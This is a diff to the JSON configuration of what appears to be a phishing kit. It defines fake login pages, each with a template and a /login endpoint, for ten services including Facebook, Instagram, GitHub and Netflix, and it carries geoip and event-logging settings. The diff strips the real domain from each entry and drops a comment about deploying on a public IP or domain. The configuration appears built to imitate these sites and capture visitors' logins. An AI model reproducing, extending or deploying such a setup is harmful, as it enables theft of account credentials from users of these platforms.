@@ -7,8 +7,7 @@
       "type": "http",
       "template": "tiktok.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "tiktok.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Instagram",
@@ -17,8 +16,7 @@
       "type": "http",
       "template": "instagram.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "instagram.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Facebook",
@@ -27,8 +25,7 @@
       "type": "http",
       "template": "facebook.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "facebook.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Snapchat",
@@ -37,8 +34,7 @@
       "type": "http",
       "template": "snapchat.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "snapchat.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Twitter",
@@ -47,8 +43,7 @@
       "type": "http",
       "template": "twitter.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "twitter.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "LinkedIn",
@@ -57,8 +52,7 @@
       "type": "http",
       "template": "linkedin.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "linkedin.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "GitHub",
@@ -67,8 +61,7 @@
       "type": "http",
       "template": "github.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "github.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Spotify",
@@ -77,8 +70,7 @@
       "type": "http",
       "template": "spotify.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "spotify.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Netflix",
@@ -87,8 +79,7 @@
       "type": "http",
       "template": "netflix.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "netflix.com"
+      "success_redirect": "/?success=1"
     },
     {
       "name": "Reddit",
@@ -97,8 +88,7 @@
       "type": "http",
       "template": "reddit.html",
       "login_endpoint": "/login",
-      "success_redirect": "/?success=1",
-      "domain": "reddit.com"
+      "success_redirect": "/?success=1"
     }
   ],
   "geoip": {
@@ -124,7 +114,7 @@
     "log_file": "events.jsonl"
   },
   "web": {
-    "base_url": "http://localhost",  # Change to your actual IP or domain when deploying
+    "base_url": "http://localhost",
     "port": 8080
   }
 }
